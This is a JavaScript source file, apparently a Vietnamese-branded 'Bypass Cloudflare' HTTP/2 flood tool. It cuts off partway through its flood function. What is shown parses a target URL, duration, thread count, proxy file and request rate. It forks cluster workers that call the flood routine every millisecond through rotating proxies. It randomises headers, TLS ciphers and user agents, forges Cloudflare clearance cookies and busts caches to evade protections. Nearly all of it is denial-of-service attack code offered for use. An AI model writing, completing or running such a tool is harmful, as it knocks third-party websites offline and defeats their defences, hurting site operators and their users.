const argsris = process.argv.slice(2);
const queryIndexris = argsris.indexOf('--debug');
const ris = queryIndexris !== -1 ? argsris[queryIndexris + 1] : null;
const errorHandler = error => {
    if (ris === "true") {
        console.log(error);
    }
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
const colors = require('colors');
const net = require("net");
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const os = require("os");
const v8 = require('v8');

const methodss = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "DELETE", "TRACE", "CONNECT", "PATCH"];
const fileExtensions = [".php", ".html", ".jsp", ".asp", ".aspx", ".htm", ".js", ".css"];
let maprate = [];
const dfcp = crypto.constants.defaultCoreCipherList.split(":");

const cipher = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256",
    "TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_DHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    dfcp[0],
    dfcp[1],
    dfcp[2],
    dfcp[3],
    ...dfcp.slice(3),
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const language_header = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-CA,en;q=0.7', 'fr-FR,fr;q=0.9', 'fr-CA,fr;q=0.8', 'de-DE,de;q=0.9', 'es-ES,es;q=0.9', 'it-IT,it;q=0.9', 'ja-JP,ja;q=0.9', 'ko-KR,ko;q=0.9', 'zh-CN,zh;q=0.9', 'zh-TW,zh;q=0.9', 'ru-RU,ru;q=0.9',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5', 'de-CH;q=0.7', 'da,en-gb;q=0.8,en;q=0.7', 'cs;q=0.5', 'nl-NL,nl;q=0.9', 'nn-NO,nn;q=0.9', 'pl-PL,pl;q=0.9', 'pt-BR,pt;q=0.9', 'pt-PT,pt;q=0.9', 'ro-RO,ro;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', 'sq-AL,sq;q=0.9', 'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9', 'sv-SE,sv;q=0.9',
    'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', 'si-LK,si;q=0.9', 'ta-IN,ta;q=0.9', 'te-IN,te;q=0.9', 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9', 'uk-UA,uk;q=0.9', 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', 'vi-VN,vi;q=0.9', 'zh-HK,zh;q=0.9',
    'am-ET,am;q=0.8', 'sw-KE,sw;q=0.9', 'zu-ZA,zu;q=0.8',
    'as-IN,as;q=0.8', 'az-Cyrl-AZ,az;q=0.8', 'bn-BD,bn;q=0.8', 'bs-Cyrl-BA,bs;q=0.8', 'bs-Latn-BA,bs;q=0.8', 'dz-BT,dz;q=0.8', 'fil-PH,fil;q=0.8', 'fr-BE,fr;q=0.8', 'fr-LU,fr;q=0.8', 'gsw-CH,gsw;q=0.8', 'ha-Latn-NG,ha;q=0.8', 'hr-BA,hr;q=0.8', 'ig-NG,ig;q=0.8', 'ii-CN,ii;q=0.8', 'is-IS,is;q=0.8', 'jv-Latn-ID,jv;q=0.8', 'ka-GE,ka;q=0.8', 'kkj-CM,kkj;q=0.8', 'kl-GL,kl;q=0.8', 'km-KH,km;q=0.8', 'kok-IN,kok;q=0.8', 'ks-Arab-IN,ks;q=0.8', 'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', 'mn-Mong-CN,mn;q=0.8', 'mr-MN,mr;q=0.8', 'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', 'mua-CM,mua;q=0.8', 'nds-DE,nds;q=0.8', 'ne-IN,ne;q=0.8', 'nso-ZA,nso;q=0.8', 'oc-FR,oc;q=0.8', 'pa-Arab-PK,pa;q=0.8', 'ps-AF,ps;q=0.8', 'quz-BO,quz;q=0.8', 'quz-EC,quz;q=0.8', 'quz-PE,quz;q=0.8', 'rm-CH,rm;q=0.8', 'rw-RW,rw;q=0.8', 'sd-Arab-PK,sd;q=0.8', 'se-NO,se;q=0.8', 'smn-FI,smn;q=0.8', 'sms-FI,sms;q=0.8', 'syr-SY,syr;q=0.8', 'tg-Cyrl-TJ,tg;q=0.8', 'ti-ER,ti;q=0.8', 'tk-TM,tk;q=0.8', 'tn-ZA,tn;q=0.8', 'ug-CN,ug;q=0.8', 'uz-Cyrl-UZ,uz;q=0.8', 've-ZA,ve;q=0.8', 'wo-SN,wo;q=0.8', 'xh-ZA,xh;q=0.8', 'yo-NG,yo;q=0.8', 'zgh-MA,zgh;q=0.8',
    'en-US,en;q=0.7,es;q=0.3', 'en-US,en;q=0.8,de;q=0.2', 'en-US,en;q=0.6,fr;q=0.4', 'en-US,en;q=0.5,ja;q=0.5', 'fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4', 'de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4', 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3', 'es-ES,es;q=0.9,en;q=0.7,fr;q=0.3', 'zh-CN,zh;q=0.9,en;q=0.7', 'ru-RU,ru;q=0.9,en;q=0.5,uk;q=0.3'
];
const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];
const custom_header_names = ['x-forwarded-for', 'x-requested-with', 'x-forwarded-proto', 'x-forwarded-host', 'x-client-ip', 'x-real-ip', 'x-client-data', 'x-request-id', 'x-correlation-id', 'x-user-agent', 'x-device-id', 'x-session-id', 'x-trace-id', 'x-api-key', 'x-powered-by', 'x-xss-protection', 'x-content-type-options', 'x-frame-options', 'x-cache', 'x-cache-hit', 'x-edge-location'];
const content_type_headers = ['application/json', 'application/xml', 'application/x-www-form-urlencoded', 'multipart/form-data', 'text/plain', 'text/html', 'text/css', 'text/javascript', 'application/javascript', 'application/pdf', 'image/jpeg', 'image/png', 'image/gif', 'image/svg+xml', 'audio/mpeg', 'video/mp4', 'application/octet-stream'];
const referrer_policy = ['no-referrer', 'no-referrer-when-downgrade', 'origin', 'origin-when-cross-origin', 'same-origin', 'strict-origin', 'strict-origin-when-cross-origin', 'unsafe-url'];
const platform_headers = ['Windows', 'macOS', 'Linux', 'iOS', 'Android', 'Windows Phone', 'Chrome OS', 'Ubuntu', 'Debian', 'FreeBSD'];
const device_headers = ['Desktop', 'Mobile', 'Tablet', 'TV', 'Watch', 'Game Console', 'Embedded', 'Bot'];
const priority_headers = ['u=0, i', 'u=1, i', 'u=2, i', 'u=3, i', 'u=4, i', 'u=5, i', 'u=6, i', 'u=7, i'];
const custom_header_fields = ["rush-combo", "rush-xjava", "rush-combo-javax", "c-xjava", "c-xjava-xjs", "blum-purpose", "blum-point"];
const sec_ch_ua_values = [`\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"129\", \"Google Chrome\";v=\"129\"`, `\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"`, `\"Chromium\";v=\"128\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"128\"`, `\"Google Chrome\";v=\"130\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"130\"`, `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"129\", \"Brave\";v=\"129\"`, `\"Not A(Brand\";v=\"99\", \"Brave\";v=\"127\", \"Chromium\";v=\"127\"`, `\"Chromium\";v=\"128\", \"Not(A:Brand\";v=\"24\", \"Brave\";v=\"128\"`, `\"Brave\";v=\"130\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"130\"`];
const cplist = ['ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'];
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'];
const cache_header = ['max-age=0', 'no-cache', 'no-store', 'pre-check=0', 'post-check=0', 'must-revalidate', 'proxy-revalidate', 's-maxage=604800', 'no-cache, no-store,private, max-age=0, must-revalidate', 'no-cache, no-store,private, s-maxage=604800, must-revalidate', 'no-cache, no-store,private, max-age=604800, must-revalidate'];
const encoding = ['gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip', 'lz4', 'lzma', 'xz', 'zlib', 'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma', 'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4', 'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4', 'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4', 'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz', 'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib', 'gzip, br, deflate', 'gzip, br, zstd', 'gzip, br, lz4', 'gzip, br, lzma', 'gzip, br, xz', 'gzip, br, zlib', 'gzip, deflate, zstd', 'gzip, deflate, lz4', 'gzip, deflate, lzma', 'gzip, deflate, xz', 'gzip, deflate, zlib', 'gzip, zstd, lz4', 'gzip, zstd, lzma', 'gzip, zstd, xz', 'gzip, zstd, zlib', 'gzip, lz4, lzma', 'gzip, lz4, xz', 'gzip, lz4, zlib', 'gzip, lzma, xz', 'gzip, lzma, zlib', 'gzip, xz, zlib', 'br, deflate, zstd', 'br, deflate, lz4', 'br, deflate, lzma', 'br, deflate, xz', 'br, deflate, zlib', 'br, zstd, lz4', 'br, zstd, lzma', 'br, zstd, xz', 'br, zstd, zlib', 'br, lz4, lzma', 'br, lz4, xz', 'br, lz4, zlib', 'br, lzma, xz', 'br, lzma, zlib', 'br, xz, zlib', 'deflate, zstd, lz4', 'deflate, zstd, lzma', 'deflate, zstd, xz', 'deflate, zstd, zlib', 'deflate, lz4, lzma', 'deflate, lz4, xz', 'deflate, lz4, zlib', 'deflate, lzma, xz', 'deflate, lzma, zlib', 'deflate, xz, zlib', 'zstd, lz4, lzma', 'zstd, lz4, xz', 'zstd, lz4, zlib', 'zstd, lzma, xz', 'zstd, lzma, zlib', 'zstd, xz, zlib', 'lz4, lzma, xz', 'lz4, lzma, zlib', 'lz4, xz, zlib', 'lzma, xz, zlib', 'gzip, br, deflate, zstd', 'gzip, br, deflate, lz4', 'gzip, br, deflate, lzma', 'gzip, br, deflate, xz', 'gzip, br, deflate, zlib', 'gzip, br, zstd, lz4', 'gzip, br, zstd, lzma', 'gzip, br, zstd, xz', 'gzip, br, zstd, zlib', 'gzip, br, lz4, lzma', 'gzip, br, lz4, xz', 'gzip, br, lz4, zlib', 'gzip, br, lzma, xz', 'gzip, br, lzma, zlib', 'gzip, br, xz, zlib', 'gzip, deflate, zstd, lz4', 'gzip, deflate, zstd, lzma', 'gzip, deflate, zstd, xz', 'gzip, deflate, zstd, zlib', 'gzip, deflate, lz4, lzma', 'gzip, deflate, lz4, xz', 'gzip, deflate, lz4, zlib', 'gzip, deflate, lzma, xz', 'gzip, deflate, lzma, zlib', 'gzip, deflate, xz, zlib', 'gzip, zstd, lz4, lzma', 'gzip, zstd, lz4, xz', 'gzip, zstd, lzma, xz', 'gzip, zstd, lzma, zlib', 'gzip, zstd, xz, zlib', 'gzip, lz4, lzma, xz', 'gzip, lz4, lzma, zlib', 'gzip, lz4, xz, zlib', 'gzip, lzma, xz, zlib', 'br, deflate, zstd, lz4', 'br, deflate, zstd, lzma', 'br, deflate, zstd, xz', 'br, deflate, zstd, zlib', 'br, deflate, lz4, lzma', 'br, deflate, lz4, xz', 'br, deflate, lz4, zlib', 'br, deflate, lzma, xz', 'br, deflate, lzma, zlib', 'br, deflate, xz, zlib', 'br, zstd, lz4, lzma', 'br, zstd, lz4, xz', 'br, zstd, lzma, xz', 'br, zstd, lzma, zlib', 'br, zstd, xz, zlib', 'br, lz4, lzma, xz', 'br, lz4, lzma, zlib', 'br, lz4, xz, zlib', 'br, lzma, xz, zlib', 'deflate, zstd, lz4, lzma', 'deflate, zstd, lz4, xz', 'deflate, zstd, lzma, xz', 'deflate, zstd, lzma, zlib', 'deflate, zstd, xz, zlib', 'deflate, lz4, lzma, xz', 'deflate, lz4, lzma, zlib', 'deflate, lz4, xz, zlib', 'deflate, lzma, xz, zlib', 'zstd, lz4, lzma, xz', 'zstd, lz4, lzma, zlib', 'zstd, lz4, xz, zlib', 'zstd, lzma, xz, zlib', 'lz4, lzma, xz, zlib'];
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

const headerFunc = {
    cipher() { return cplist[Math.floor(Math.random() * cplist.length)]; },
    sigalgs() { return sigalgs[Math.floor(Math.random() * sigalgs.length)]; },
    accept() { return accept_header[Math.floor(Math.random() * accept_header.length)]; },
    cache() { return cache_header[Math.floor(Math.random() * cache_header.length)]; },
    encoding() { return encoding[Math.floor(Math.random() * encoding.length)]; },
    language() { return language_header[Math.floor(Math.random() * language_header.length)]; },
    fetchSite() { return fetch_site[Math.floor(Math.random() * fetch_site.length)]; },
    fetchMode() { return fetch_mode[Math.floor(Math.random() * fetch_mode.length)]; },
    fetchDest() { return fetch_dest[Math.floor(Math.random() * fetch_dest.length)]; },
    customHeader() { return custom_header_names[Math.floor(Math.random() * custom_header_names.length)]; },
    contentType() { return content_type_headers[Math.floor(Math.random() * content_type_headers.length)]; },
    referrer() { return referrer_policy[Math.floor(Math.random() * referrer_policy.length)]; },
    platform() { return platform_headers[Math.floor(Math.random() * platform_headers.length)]; },
    device() { return device_headers[Math.floor(Math.random() * device_headers.length)]; },
    priority() { return priority_headers[Math.floor(Math.random() * priority_headers.length)]; },
    secChUa() { return sec_ch_ua_values[Math.floor(Math.random() * sec_ch_ua_values.length)]; }
};

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
let rps = process.argv[6];
let initialRps = parseInt(rps);
let currentRps = initialRps;

// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
    console.log('NGTUAN - Bypass Cloudflare'.bgRed);
    console.log('Cú pháp:'.blue, `node ${process.argv[1]} <target_url> <time> <threads> <proxy_file> <rate> [options]`);
    console.log('Ví dụ cơ bản:'.blue, `node ${process.argv[1]} https://example.com 60 30 proxy.txt 20`);
    console.log('Tùy chọn:'.blue);
    console.log('  --status true       : Hiển thị Total RPS, Request Code, Status Code mỗi 3-5 giây.');
    console.log('  --cookie true       : Thêm cookie ngẫu nhiên (v1token__bfw, cf_clearance).');
    console.log('  --ratelimit true    : Giảm RPS khi nhận mã 429.');
    console.log('  --connect <số>      : Số kết nối proxy đồng thời (mặc định: 1).');
    console.log('  --method <method>   : HTTP method (GET, POST, PUT, etc.; mặc định: GET).');
    console.log('  --query path        : Thêm đường dẫn + query ngẫu nhiên.');
    console.log('  --query string      : Thêm query string ngẫu nhiên.');
    console.log('  --write true        : Gửi dữ liệu nhị phân ngẫu nhiên.');
    console.log('  --redirect true     : Theo dõi chuyển hướng 301/302.');
    console.log('  --cache             : Thêm ?cache_bust=<timestamp> để bypass cache.');
    console.log('  --ua true           : User-Agent ngẫu nhiên dài.');
    console.log('  --ua <chuỗi>        : User-Agent tùy chỉnh.');
    console.log('  --referer google    : Thêm Referer từ Google.');
    console.log('  --googlebot         : Sử dụng User-Agent Googlebot.');
    console.log('Liên hệ:'.blue, 'Telegram: @Keinamvy'.green);
    process.exit(1);
}

// Validate target format
if (!/^https?:\/\//i.test(target)) {
    console.error('Target must start with http:// or https://'.red);
    process.exit(1);
}

// Parse proxy list
let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.match(/\S+/g) || [];
    proxys = [...new Set(proxys)];
    proxys = proxys.filter(proxy => isValidProxy(proxy));
    shuffleArray(proxys);
    if (proxys.length === 0) {
        console.error('No valid proxies found in the file.'.red);
        process.exit(1);
    }
} catch (err) {
    console.error('Error reading proxy file:'.red, err.message);
    process.exit(1);
}

let totalProxies = proxys.length;

// Validate RPS value
if (isNaN(rps) || rps <= 0) {
    console.error('Invalid RPS value. Must be a positive number.'.red);
    process.exit(1);
}

const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
};

let randbyte = 1;
setInterval(() => {
    randbyte = Math.floor(Math.random() * 5) + 1;
}, 5000);
setInterval(() => {
    shuffleArray(proxys);
}, 10000);

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]]; // Fixed syntax error
    }
    return array;
}

function httpPing(url) {
    const argstos = process.argv.slice(2);
    const queryIndextos = argstos.indexOf('--status');
    const tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;

    if (tos === 'true') {
        return;
    }

    try {
        const client = http2.connect(url);
        const startTime = Date.now();
        const urlping = new URL(url);

        const req = client.request({
            ':method': 'GET',
            ':authority': urlping.host,
            ':scheme': 'https',
            ':path': urlping.pathname
        });

        req.once('response', (headers, flags) => {
            const duration = Date.now() - startTime;
            let message = '';

            if (headers[':status'] === 403) {
                message = 'Ping blocked';
            } else if (headers[':status'] === 429) {
                message = 'Ping ratelimited';
            } else if (duration > 15000) {
                message = 'Timeout';
            } else {
                message = `Ping response received in ${duration}ms`;
            }

            process.stdout.cursorTo(0, 6);
            process.stdout.clearLine();
            process.stdout.write(`${message}    `);

            req.end();
            client.close();
        });

        req.once('error', (err) => {
            client.close();
        });

        req.end();
    } catch (e) {
        process.stdout.cursorTo(0, 6);
        process.stdout.clearLine();
        process.stdout.write(`Exception: ${e.message}`);
    }
}

const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--status');
let tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;

if (tos !== 'true') {
    httpPing(target);
    setInterval(async () => {
        await httpPing(target);
    }, 5000);
}

const statusCounts = {};
let lastUpdateTime = Date.now();

const countStatus = (status) => {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
};

function getStatusColor(status) {
    const statusInt = parseInt(status);
    if (statusInt >= 200 && statusInt < 300) {
        return colors.green.underline;
    } else if (statusInt >= 300 && statusInt < 400) {
        return colors.gray.underline;
    } else if (statusInt >= 400 && statusInt < 500) {
        return colors.yellow.underline;
    } else if (statusInt >= 500 && statusInt < 600) {
        return colors.red.underline;
    } else {
        return colors.white.underline;
    }
}

const attackStartTime = Date.now();
const attackDuration = parseInt(time, 10); // Total attack time in seconds

function printStatusCounts() {
    // Clear console if --status true is enabled
    if (tos === 'true') {
        console.clear();
    }

    // Calculate remaining attack time
    const elapsedTime = Math.floor((Date.now() - attackStartTime) / 1000);
    const remainingTime = Math.max(0, attackDuration - elapsedTime);
    const minutes = Math.floor(remainingTime / 60);
    const seconds = remainingTime % 60;
    const timeString = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

    // Display status metrics
    process.stdout.cursorTo(0, 0);
    process.stdout.clearLine();
    process.stdout.write('[CF/JS] Status: [ ');

    const statusList = Object.entries(statusCounts).map(([status, count]) => {
        return `${getStatusColor(status)(status)} ${count}`;
    }).join(', ');

    process.stdout.write(statusList || 'No responses yet...'.gray);
    process.stdout.write(` ] | Time: ${timeString.green}\n`);

    // Reset counters for the next interval
    lastUpdateTime = Date.now();
    Object.keys(statusCounts).forEach(status => {
        statusCounts[status] = 0;
    });
}

function response(res) {
    const status = res[':status'];
    countStatus(status);
}

function generateRandomString(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function generateToken(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomLongString() {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=?/.:;[]{}|';
    const baseLength = Math.floor(Math.random() * (300 - 200 + 1)) + 200;
    const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const platforms = ['Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15', 'Linux x86_64'];
    const versions = [`${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 1000)}.${Math.floor(Math.random() * 100)}`];

    let result = `Mozilla/5.0 (${platforms[Math.floor(Math.random() * platforms.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) ${browsers[Math.floor(Math.random() * browsers.length)]}/${versions[0]} Safari/537.36 `;
    const extraLength = baseLength - result.length;
    for (let i = 0; i < extraLength; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const queryIndexcoo = argstos.indexOf('--cookie');
let coo = queryIndexcoo !== -1 ? argstos[queryIndexcoo + 1] : null;

let cookie = '';
if (coo === "true") {
    cookie = `v1token__bfw=${generateRandomString(30, 100)}; cf_clearance=${generateToken(128)}-${Date.now()}-1.2.1.1-${generateToken(6)}`;
}

if (tos === 'true') {
    setInterval(printStatusCounts, randomDelay(3000, 5000)); // Update every 3-5 seconds
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const interval = randomDelay(500, 1000);
const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 10;

if (cluster.isMaster) {
    if (tos !== 'true') {
        console.clear();
        console.log('NGTUAN - Attack Started'.bgGreen.black);
        console.log(`Target: ${target} | Time: ${time}s | Threads: ${thread} | RPS: ${rps}`);
        console.log(`Proxies: ${totalProxies} | File: ${proxyFile}`);
        console.log('-----------------------------------------'.gray);
        function readServerInfo() {
            let totalIdle = 0, totalTick = 0;
            const cpus = os.cpus();
            for (let cpu of cpus) {
                for (let type in cpu.times) {
                    totalTick += cpu.times[type];
                }
                totalIdle += cpu.times.idle;
            }
            const cpuUsage = ((1 - totalIdle / totalTick) * 100).toFixed(2);
            const heapStats = v8.getHeapStatistics();
            const heapUsed = (heapStats.used_heap_size / (1024 * 1024)).toFixed(2);
            const heapTotal = (heapStats.total_heap_size / (1024 * 1024)).toFixed(2);
            const totalRAM = (os.totalmem() / (1024 * 1024)).toFixed(2);
            const usedRAM = ((os.totalmem() - os.freemem()) / (1024 * 1024)).toFixed(2);
            const ramPercentage = ((usedRAM / totalRAM) * 100).toFixed(2);
            const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok', hour: '2-digit', minute: '2-digit', second: '2-digit' });
            process.stdout.cursorTo(0, 5);
            process.stdout.clearLine();
            process.stdout.write(`CPU: ${cpuUsage}% | RAM: ${usedRAM}/${totalRAM}MB (${ramPercentage}%) | Heap: ${heapUsed}/${heapTotal}MB | Time: ${currentTime}`.bgRed);
        }
        setInterval(readServerInfo, 1000);
    }

    const restartScript = () => {
        Object.values(cluster.workers).forEach(worker => worker.kill());
        if (tos !== 'true') {
            process.stdout.cursorTo(0, 7);
            process.stdout.clearLine();
            console.log(`[<>] Restarting...`.bgYellow);
        }

        setTimeout(() => {
            for (let i = 0; i < thread; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            if (tos !== 'true') {
                process.stdout.cursorTo(0, 8);
                process.stdout.clearLine();
                console.log(`[<!>] Maximum RAM reached`.bgRed);
            }
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 1000);

    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }

    setTimeout(() => { console.clear(); process.exit(-1) }, time * 1000);
} else {
    setInterval(() => {
        flood();
    }, 1);
}

function isValidProxy(proxy) {
    const simpleProxyRegex = /^([a-zA-Z0-9.-]+|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})$/;
    const authProxyRegex = /^([a-zA-Z0-9.-]+|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5}):([^:]+):([^:]+)$/;

    if (simpleProxyRegex.test(proxy)) {
        const [, host, port] = proxy.match(simpleProxyRegex);
        const isValidPort = Number(port) >= 0 && Number(port) <= 65535;
        if (host.includes('.')) {
            if (host.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
                const ipParts = host.split('.').map(Number);
                return isValidPort && ipParts.length === 4 && ipParts.every(part => part >= 0 && part <= 255);
            }
            return isValidPort;
        }
        return false;
    } else if (authProxyRegex.test(proxy)) {
        const [, host, port] = proxy.match(authProxyRegex);
        const isValidPort = Number(port) >= 0 && Number(port) <= 65535;
        if (host.includes('.')) {
            if (host.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
                const ipParts = host.split('.').map(Number);
                return isValidPort && ipParts.length === 4 && ipParts.every(part => part >= 0 && part <= 255);
            }
            return isValidPort;
        }
        return false;
    }
    return false;
}

async function flood() {
    let sigals = headerFunc.sigalgs();
    let parsed = new URL(target);
    const currentTime = Date.now();
    maprate = maprate.filter(limit => currentTime - limit.timestamp <= 15000);
    (() => {
        const currentTime = Date.now();
